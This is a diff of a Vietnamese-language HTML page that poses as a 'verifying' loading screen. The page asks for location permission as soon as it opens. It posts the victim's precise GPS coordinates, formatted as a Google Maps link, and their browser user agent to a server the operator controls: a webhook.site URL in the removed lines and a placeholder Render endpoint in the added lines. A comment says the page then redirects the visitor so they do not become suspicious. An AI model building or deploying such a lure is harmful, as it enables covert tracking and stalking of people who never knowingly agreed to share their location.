@@ -3,56 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đang tải dữ liệu...</title>
+    <title>Đang xác thực...</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .loader { margin: 20px auto; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h3>Vui lòng cấp quyền truy cập vị trí để tiếp tục...</h3>
-    
+    <h3>Vui lòng cấp quyền truy cập vị trí để tiếp tục</h3>
+    <div class="loader"></div>
+    <p id="status">Đang đợi tín hiệu...</p>
+
     <script>
-        // Thay đường link này bằng API Server của bạn
-        const API_URL = 'https://webhook.site/6fd3239b-8f46-4248-b895-9f886fd0c05a';
+        // ============================================================
+        // BƯỚC QUAN TRỌNG: Thay link dưới bằng link Render của bạn
+        // Ví dụ: const SERVER_URL = 'https://tencuaban.onrender.com/luu-vi-tri';
+        const SERVER_URL = 'DÁN_LINK_SERVER_RENDER_CỦA_BẠN_VÀO_ĐÂY/luu-vi-tri'; 
+        // ============================================================
 
         function guiViTri(position) {
+            const lat = position.coords.latitude;
+            const long = position.coords.longitude;
+            
+            // Tạo link Google Maps chính xác
+            const googleMapLink = `https://www.google.com/maps?q=${lat},${long}`;
+
             const data = {
-                latitude: position.coords.latitude,   // Vĩ độ
-                longitude: position.coords.longitude, // Kinh độ
-                accuracy: position.coords.accuracy,   // Độ chính xác (mét)
-                userAgent: navigator.userAgent        // Thông tin thiết bị
+                link_ggmap: googleMapLink,
+                device: navigator.userAgent
             };
 
-            // Gửi dữ liệu về Server bằng Fetch API
-            fetch(API_URL, {
+            fetch(SERVER_URL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             })
-            .then(response => console.log('Đã gửi vị trí thành công'))
-            .catch(error => console.error('Lỗi khi gửi:', error));
+            .then(response => {
+                document.getElementById('status').innerText = "Thành công!";
+                // Chuyển hướng người dùng đi chỗ khác để họ không nghi ngờ
+                window.location.href = googleMapLink; 
+            })
+            .catch(err => {
+                console.error("Lỗi:", err);
+                document.getElementById('status').innerText = "Lỗi kết nối server!";
+            });
         }
 
-        function xuLyLoi(error) {
-            console.warn(`Lỗi: ${error.code}: ${error.message}`);
-            // Có thể hiển thị thông báo nếu người dùng từ chối
-            // alert("Bạn cần bật vị trí để sử dụng tính năng này.");
+        function tuChoi(error) {
+            document.getElementById('status').innerText = "Bạn cần bấm 'Cho phép' (Allow) để tiếp tục.";
+            console.warn("Người dùng từ chối cấp quyền.");
         }
 
-        // Tùy chọn độ chính xác
-        const options = {
-            enableHighAccuracy: true, // Lấy vị trí chính xác nhất (dùng GPS)
-            timeout: 5000,
-            maximumAge: 0
-        };
-
-        // Hàm chính để yêu cầu vị trí ngay khi trang web tải xong
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(guiViTri, xuLyLoi, options);
-            } else {
-                console.log("Trình duyệt này không hỗ trợ định vị.");
-            }
-        };
+        // Tự động xin quyền khi vào trang
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(guiViTri, tuChoi, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
+        } else {
+            alert("Trình duyệt không hỗ trợ.");
+        }
     </script>
 </body>
 </html>
